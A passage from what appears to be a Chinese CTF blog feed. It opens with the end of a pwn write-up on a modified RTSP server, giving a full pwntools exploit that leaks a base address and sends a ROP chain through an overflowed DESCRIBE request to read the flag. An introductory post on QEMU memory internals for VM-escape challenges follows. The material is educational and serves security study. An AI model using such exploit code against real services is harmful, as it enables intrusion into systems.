class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;info&#x27;)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8554</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;8.147.132.53&quot;,36720)</span></span><br><span class="line"><span class="comment">#p =  process(&#x27;./A-rtsp&#x27;)</span></span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line">r = <span class="keyword">lambda</span>              : p.recv(<span class="number">4096</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> a=<span class="literal">False</span>     : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x             : p.recvn(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x           : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span>           : u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span>           : u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line">lg = <span class="keyword">lambda</span> s,addr      : log.info(<span class="string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s,addr))</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;GET_PARAMETER rtsp://192.168.127.133:8554/* RTSP/1.0\r\nCSeq: 2\r\nGET_INFO: 2023\r\n\r\n&#x27;</span>)</span><br><span class="line">baseaddr = <span class="built_in">int</span>(rl(<span class="string">&quot;0\n&#x27;&quot;</span>)[-<span class="number">15</span>:],<span class="number">16</span>)-<span class="number">0x2A9990</span></span><br><span class="line"><span class="comment">#codebase = rl(&quot;0\n&#x27;&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(baseaddr)</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;SET_PARAMETER rtsp://192.168.127.133:8554/* RTSP/1.0\r\nDESCRIBE_FLAG: qwb\r\nCSeq: 2\r\nUser-Agent: fuck\r\n\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x000000000007b133</span>+baseaddr </span><br><span class="line">pop_rsi_ret=<span class="number">0x0000000000099fb0</span>+baseaddr </span><br><span class="line">pop_rdx_ret=<span class="number">0x0000000000019eaa</span>+baseaddr </span><br><span class="line">pop_rax_ret = <span class="number">0x0000000000035e4a</span>+baseaddr</span><br><span class="line">syscall = <span class="number">0x0000000000019eac</span>+baseaddr</span><br><span class="line"></span><br><span class="line">flag = baseaddr+<span class="number">0x7B3E5</span></span><br><span class="line"><span class="comment">#rop =pop_rax_ret+ p6(59)+ pop_rdi_ret + bin_sh + pop_rsi_ret + p64(0) + pop_rdx_ret + p64(0) + syscall_ret</span></span><br><span class="line"></span><br><span class="line">rop=p64(pop_rdi_ret)+p64(flag)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rax_ret)+p64(<span class="number">2</span>)+p64(syscall) <span class="comment">#open</span></span><br><span class="line">rop+=p64(pop_rdi_ret)+p64(<span class="number">6</span>)+p64(pop_rsi_ret)+p64(baseaddr+<span class="number">0x2A9990</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x60</span>)+p64(pop_rax_ret)+p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line">rop+=p64(pop_rdi_ret)+p64(<span class="number">5</span>)+p64(pop_rsi_ret)+p64(baseaddr+<span class="number">0x2A9990</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x60</span>)+p64(pop_rax_ret)+p64(<span class="number">1</span>)+p64(syscall)</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;DESCRIBE rtsp://192.168.127.133:8554/&#x27;</span> +<span class="string">b&quot;a&quot;</span>*<span class="number">198</span>+<span class="string">b&quot;/&quot;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">198</span>+ <span class="string">b&#x27; RTSP/1.0\r\nvul_string:&#x27;</span> + <span class="string">b&#x27;\xa7&#x27;</span> *<span class="number">13</span> + rop + <span class="string">b&#x27;\r\nCSeq: 2\r\n\r\n&#x27;</span>)</span><br><span class="line">data=r()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>最后一步还有一个最关键的点就是循环时的数组下标其也是在溢出范围内的,所以溢出时需要对其进行恢复,否则就会出错</p><p>在有些wp中提到在进行其他操作之前,需要先进行一次<code>SETUP</code>方法调用,来拿到一个<code>session</code></p><p>但实际上这应该是常规协议的要求,因为题目代码的魔改,其实不用也行</p><p>此外还要注意这类与端口交互的题目,写flag都要写到sockfd上,这样才能被接收,至于如何找到这个fd,最简单粗暴的方法就是一个一个遍历了</p><h2 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h2><p>这类题目重点在于查找信息</p><p>找到关键的题目源码,协议使用标准</p><p>最后找到题目被修改后潜藏漏洞的点,否则纯靠逆向,狗都不逆了属于是</p><h1 id="simpleinterpreter"><a href="#simpleinterpreter" class="headerlink" title="simpleinterpreter"></a>simpleinterpreter</h1><p>一道解释器题目</p><p>看wp说github上有源码,可惜没找到</p><p>从字符串可以看出支持的功能有以下这些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000003FC800000065Cchar else enum if int return sizeof while read close printf malloc free memset memcmp exit void main</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">协议服务器类题目</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="协议" scheme="https://ixout.github.io/tags/%E5%8D%8F%E8%AE%AE/"/>
    
    <category term="server" scheme="https://ixout.github.io/tags/server/"/>
    
    <category term="rtsp" scheme="https://ixout.github.io/tags/rtsp/"/>
    
  </entry>
  
  <entry>
    <title>qemu-escape初识</title>
    <link href="https://ixout.github.io/posts/28098/"/>
    <id>https://ixout.github.io/posts/28098/</id>
    <published>2024-04-18T10:51:37.000Z</published>
    <updated>2024-05-03T12:18:46.930Z</updated>
    
    <content type="html"><![CDATA[<p><strong>参考:</strong></p><p><a href="https://xz.aliyun.com/t/6562?time__1311=n4%2BxnD0DRDBAi%3DGkDgiDlhjmYE%3Dx907Q2GlYD">qemu pwn-基础知识 - 先知社区 (aliyun.com)</a></p><p><a href="https://bbs.kanxue.com/thread-265501.htm">原创]QEMU逃逸初探-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://ctf-wiki.org/pwn/virtualization/qemu/basic-knowledge/mm/">QEMU 内存管理 - CTF Wiki (ctf-wiki.org)</a></p><p><a href="https://arttnbmy.cn/2022/08/30/HARDWARE-0X00-PCI_DEVICE/">【HARDWARE.0x00】PCI 设备简易食用手册 - arttnbmy’s blog</a></p><p><a href="https://www.cnblogs.com/edver/p/14684143.html">QOM模型初始化流程 - Edver - 博客园 (cnblogs.com)</a></p><p><a href="https://www.owalle.com/2018/12/26/qemu-qom/">利用QOM(Qemu Object Model)创建虚拟设备 | Yi颗烂樱桃 (owalle.com)</a></p><p><a href="https://martins3.github.io/qemu/qom.html">QEMU 中的面向对象 : QOM | Deep Dark Fantasy (martins3.github.io)</a></p><h1 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h1><p>QEMU（Quick Emulator）是一个开源的虚拟机监控器和仿真器，可以在多种主机架构之间进行硬件级别的虚拟化。它允许用户在一台计算机上运行不同架构的操作系统，比如在x86架构的计算机上运行ARM架构的操作系统。QEMU可以模拟处理器、内存、存储设备、网络接口等硬件，并提供了一组工具和库来管理虚拟化环境。它被广泛用于开发、测试和调试操作系统、应用程序和嵌入式系统。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/876323_SFNDT7H88YVDYUK.jpg" alt=""></p><h2 id="内存模型"><a href="#内存模型" class="headerlink" title="内存模型"></a>内存模型</h2><h3 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h3><p>在虚拟机中不论是kvm还是qemu有几个关键的地址。</p><p>GVA：guest virtual address（虚拟机中的虚拟地址）</p><p>GPA：guest physical address（虚拟机中的物理地址）</p><p>HVA：host virtual address（宿主机中的虚拟地址）</p><p>HPA： host physical address（宿主机中的物理地址）</p><p>整体地址的话：从GVA -&gt; GPA -&gt; HVA -&gt; HPA 这样的转换。</p><p>而GPA实际是由宿主机进程mmap出来的空间。</p><p>而在qemu-kvm架构下，<strong>QEMU充当kvm的前端，传递IO。kvm负责做内存以及CPU的虚拟化。</strong></p><p>qemu进行会为虚拟机mmap分配出相应虚拟机申请大小的内存，用于给该虚拟机当作物理内存(在虚拟机进程中只会看到虚拟地址)</p><p>例如,qemu虚拟机对应的内存为1G，虚拟机启动后查看qemu的地址空间，可以看到存在一个大小为<code>0x40000000</code>内存空间，即为该虚拟机的物理内存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fe37fe00000     0x7fe3bfe00000 rw-p 40000000 0 ;虚拟机对应的内存</span><br></pre></td></tr></table></figure><h3 id="GUEST视角"><a href="#GUEST视角" class="headerlink" title="GUEST视角"></a>GUEST视角</h3><h4 id="MemoryRegion"><a href="#MemoryRegion" class="headerlink" title="MemoryRegion"></a>MemoryRegion</h4><p>在 Qemu 当中使用 <code>MemoryRegion</code> 结构体类型来表示一块具体的 Guest 物理内存区域，该结构体定义于 <code>include/exec/memory.h</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** MemoryRegion:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 表示一块内存区域的一个结构体.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following fields should fit in a cache line */</span></span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> ram;</span><br><span class="line">    <span class="type">bool</span> subpage;</span><br><span class="line">    <span class="type">bool</span> readonly; <span class="comment">/* For RAM regions */</span></span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">    <span class="type">bool</span> rom_device;</span><br><span class="line">    <span class="type">bool</span> flush_coalesced_mmio;</span><br><span class="line">    <span class="type">bool</span> global_locking;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> is_iommu;</span><br><span class="line">    RAMBlock *ram_block;</span><br><span class="line">    Object *owner;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> MemoryRegionOps *ops;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    MemoryRegion *container;    <span class="comment">// 指向父 MemoryRegion</span></span><br><span class="line">    Int128 size;    <span class="comment">// 内存区域大小</span></span><br><span class="line">    hwaddr addr;    <span class="comment">// 在父 MR 中的偏移量</span></span><br><span class="line">    <span class="type">void</span> (*destructor)(MemoryRegion *mr);</span><br><span class="line">    <span class="type">uint64_t</span> align;</span><br><span class="line">    <span class="type">bool</span> terminates;</span><br><span class="line">    <span class="type">bool</span> ram_device;</span><br><span class="line">    <span class="type">bool</span> enabled;</span><br><span class="line">    <span class="type">bool</span> warning_printed; <span class="comment">/* For reservations */</span></span><br><span class="line">    <span class="type">uint8_t</span> vga_logging_count;</span><br><span class="line">    MemoryRegion *alias;    <span class="comment">// 仅在 alias MR 中，指向实际的 MR</span></span><br><span class="line">    hwaddr alias_offset;</span><br><span class="line">    <span class="type">int32_t</span> priority;</span><br><span class="line">    QTAILQ_HEAD(, MemoryRegion) subregions;</span><br><span class="line">    QTAILQ_ENTRY(MemoryRegion) subregions_link;</span><br><span class="line">    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">unsigned</span> ioeventfd_nb;</span><br><span class="line">    MemoryRegionIoeventfd *ioeventfds;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 Qemu 当中有三种类型的 MemoryRegion：</p><ul><li>MemoryRegion 根：通过 <code>memory_region_init()</code> 进行初始化，其用以表示与管理由多个 sub-MemoryRegion 组成的一个内存区域，并不实际指向一块内存区域，例如 <code>system_memory</code>。</li><li>MemoryRegion 实体：通过 <code>memory_region_init_ram()</code> 初始化，表示具体的一块大小为 size 的内存空间，指向一块具体的内存。</li><li>MemoryRegion 别名：通过 <code>memory_region_init_alias()</code> 初始化，作为另一个 MemoryRegion 实体的别名而存在，不指向一块实际内存。</li></ul><p>MR 容器与 MR 实体间构成树形结构，其中容器为根节点而实体为子节点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">                       struct MemoryRegion</span><br><span class="line">                       +------------------------+                                         </span><br><span class="line">                       |name                    |                                         </span><br><span class="line">                       |  (const char *)        |                                         </span><br><span class="line">                       +------------------------+                                         </span><br><span class="line">                       |addr                    |                                         </span><br><span class="line">                       |  (hwaddr)              |                                         </span><br><span class="line">                       |size                    |                                         </span><br><span class="line">                       |  (Int128)              |                                         </span><br><span class="line">                       +------------------------+                                         </span><br><span class="line">                       |subregions              |                                         </span><br><span class="line">                       |    QTAILQ_HEAD()       |                                         </span><br><span class="line">                       +------------------------+                                         </span><br><span class="line">                                  |</span><br><span class="line">                                  |</span><br><span class="line">          ----+-------------------+---------------------+----</span><br><span class="line">              |                                         |</span><br><span class="line">              |                                         |</span><br><span class="line">              |                                         |</span><br><span class="line"></span><br><span class="line">struct MemoryRegion                            struct MemoryRegion</span><br><span class="line">+------------------------+                     +------------------------+</span><br><span class="line">|name                    |                     |name                    |</span><br><span class="line">|  (const char *)        |                     |  (const char *)        |</span><br><span class="line">+------------------------+                     +------------------------+</span><br><span class="line">|addr                    |                     |addr                    |</span><br><span class="line">|  (hwaddr)              |                     |  (hwaddr)              |</span><br><span class="line">|size                    |                     |size                    |</span><br><span class="line">|  (Int128)              |                     |  (Int128)              |</span><br><span class="line">+------------------------+                     +------------------------+</span><br><span class="line">|subregions              |                     |subregions              |</span><br><span class="line">|    QTAILQ_HEAD()       |                     |    QTAILQ_HEAD()       |</span><br><span class="line">+------------------------+                     +------------------------+</span><br></pre></td></tr></table></figure><p>相应地，基于 OOP 的思想，MemoryRegion 的成员函数被封装在函数表 <code>MemoryRegionOps</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Memory region callbacks</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegionOps</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 从内存区域上读. @addr 与 @mr 有关; @size 单位为字节. */</span></span><br><span class="line">    <span class="type">uint64_t</span> (*read)(<span class="type">void</span> *opaque,</span><br><span class="line">                     hwaddr addr,</span><br><span class="line">                     <span class="type">unsigned</span> size);</span><br><span class="line">    <span class="comment">/* 往内存区域上写. @addr 与 @mr 有关; @size 单位为字节. */</span></span><br><span class="line">    <span class="type">void</span> (*write)(<span class="type">void</span> *opaque,</span><br><span class="line">                  hwaddr addr,</span><br><span class="line">                  <span class="type">uint64_t</span> data,</span><br><span class="line">                  <span class="type">unsigned</span> size);</span><br><span class="line"></span><br><span class="line">    MemTxResult (*read_with_attrs)(<span class="type">void</span> *opaque,</span><br><span class="line">                                   hwaddr addr,</span><br><span class="line">                                   <span class="type">uint64_t</span> *data,</span><br><span class="line">                                   <span class="type">unsigned</span> size,</span><br><span class="line">                                   MemTxAttrs attrs);</span><br><span class="line">    MemTxResult (*write_with_attrs)(<span class="type">void</span> *opaque,</span><br><span class="line">                                    hwaddr addr,</span><br><span class="line">                                    <span class="type">uint64_t</span> data,</span><br><span class="line">                                    <span class="type">unsigned</span> size,</span><br><span class="line">                                    MemTxAttrs attrs);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">device_endian</span> <span class="title">endianness</span>;</span></span><br><span class="line">    <span class="comment">/* Guest可见约束: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="comment">/* 若非 0，则指定了超出机器检查范围的访问大小界限</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">unsigned</span> min_access_size;</span><br><span class="line">        <span class="type">unsigned</span> max_access_size;</span><br><span class="line">        <span class="comment">/* If true, unaligned accesses are supported.  Otherwise unaligned</span></span><br><span class="line"><span class="comment">         * accesses throw machine checks.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">         <span class="type">bool</span> unaligned;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 若存在且 #false, 则该事务不会被设备所接受</span></span><br><span class="line"><span class="comment">         * (并导致机器的相关行为，例如机器检查异常).</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">bool</span> (*accepts)(<span class="type">void</span> *opaque, hwaddr addr,</span><br><span class="line">                        <span class="type">unsigned</span> size, <span class="type">bool</span> is_write,</span><br><span class="line">                        MemTxAttrs attrs);</span><br><span class="line">    &#125; valid;</span><br><span class="line">    <span class="comment">/* 内部应用约束: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="comment">/* 若非 0，则决定了最小的实现的 size .</span></span><br><span class="line"><span class="comment">         * 更小的 size 将被向上回绕，且将返回部分结果.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">unsigned</span> min_access_size;</span><br><span class="line">        <span class="comment">/* 若非 0，则决定了最大的实现的 size . </span></span><br><span class="line"><span class="comment">         * 更大的 size 将被作为一系列的更小的 size 的访问而完成.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">unsigned</span> max_access_size;</span><br><span class="line">        <span class="comment">/* 若为 true, 支持非对齐的访问.  </span></span><br><span class="line"><span class="comment">         * 否则所有的访问都将被转换为（可能多种）对齐的访问.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">bool</span> unaligned;</span><br><span class="line">    &#125; impl;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们的 Guest 要读写虚拟机上的内存时，在 Qemu 内部实际上会调用 <code>address_space_rw()</code>，对于一般的 RAM 内存而言则直接对 MR 对应的内存进行操作，对于 MMIO 而言则最终调用到对应的 <code>MR-&gt;ops-&gt;read()</code> 或 <code>MR-&gt;ops-&gt;write()</code>。</p><p>同样的，为了统一接口，在 Qemu 当中 <strong>PMIO 的实现同样是通过 MemoryRegion 来完成的</strong>，我们可以把一组端口理解为 QEMU 视角的一块 Guest 内存。</p><h4 id="FlatView"><a href="#FlatView" class="headerlink" title="FlatView"></a>FlatView</h4><p><code>FlatView</code> 用来表示<strong>一棵 MemoryRegion 树所表示的 Guest 地址空间</strong>，其使用一个 <code>FlatRange</code> 结构体指针数组来存储不同 <code>MemoryRegion</code> 对应的地址信息，每个 <code>FlatRange</code> 表示单个 <code>MemoryRegion</code> 的 <strong>Guest 视角的一块物理地址空间</strong>以及是否只读等特性信息， <code>FlatRange</code> 之间所表示的地址范围不会重叠。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Range of memory in the global map.  Addresses are absolute. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FlatRange</span> &#123;</span></span><br><span class="line">    MemoryRegion *mr;</span><br><span class="line">    hwaddr offset_in_region;</span><br><span class="line">    AddrRange addr;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> readonly;</span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Flattened global view of current active memory hierarchy.  Kept in sorted</span></span><br><span class="line"><span class="comment"> * order.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FlatView</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> ref;</span><br><span class="line">    FlatRange *ranges;</span><br><span class="line">    <span class="type">unsigned</span> nr;</span><br><span class="line">    <span class="type">unsigned</span> nr_allocated;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">AddressSpaceDispatch</span> *<span class="title">dispatch</span>;</span></span><br><span class="line">    MemoryRegion *root;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="AddressSpace"><a href="#AddressSpace" class="headerlink" title="AddressSpace"></a>AddressSpace</h4><p><code>AddressSpace</code> 结构体用以表示 <strong>Guest 视角不同类型的地址空间</strong>，在 x86 下其实就只有两种：<code>address_space_memory</code> 与 <code>address_space_io</code>。</p><p>单个 <code>AddressSpace</code> 结构体与一棵 MemoryRegion 树的根节点相关联，并使用一个 <code>FlatView</code> 结构体建立该树的平坦化内存空间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct AddressSpace: describes a mapping of addresses to #MemoryRegion objects</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AddressSpace</span> &#123;</span></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    MemoryRegion *root;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Accessed via RCU.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">FlatView</span> *<span class="title">current_map</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ioeventfd_nb;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegionIoeventfd</span> *<span class="title">ioeventfds</span>;</span></span><br><span class="line">    QTAILQ_HEAD(, MemoryListener) listeners;</span><br><span class="line">    QTAILQ_ENTRY(AddressSpace) address_spaces_link;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><p>最终可以得到这样一张图:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-02_211734.png" alt=""></p><h3 id="HOST视角"><a href="#HOST视角" class="headerlink" title="HOST视角"></a>HOST视角</h3><h4 id="RAMBlock"><a href="#RAMBlock" class="headerlink" title="RAMBlock"></a>RAMBlock</h4><p>用于表示:<strong>MR 对应的 Host 虚拟内存</strong></p><p><code>RAMBlock</code> 结构体用来表示<strong>单个实体 MemoryRegion 所占用的 Host 虚拟内存信息</strong>，多个 <code>RAMBlock</code> 结构体之间构成单向链表。</p><p>比较重要的成员如下：</p><ul><li><code>mr</code>：该 RAMBlock 对应的 MemoryRegion（即 HVA → GPA）</li><li><code>host</code>：GVA 对应的 HVA，通常由 QEMU 通过 <code>mmap()</code> 获得（如果未使用 KVM）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 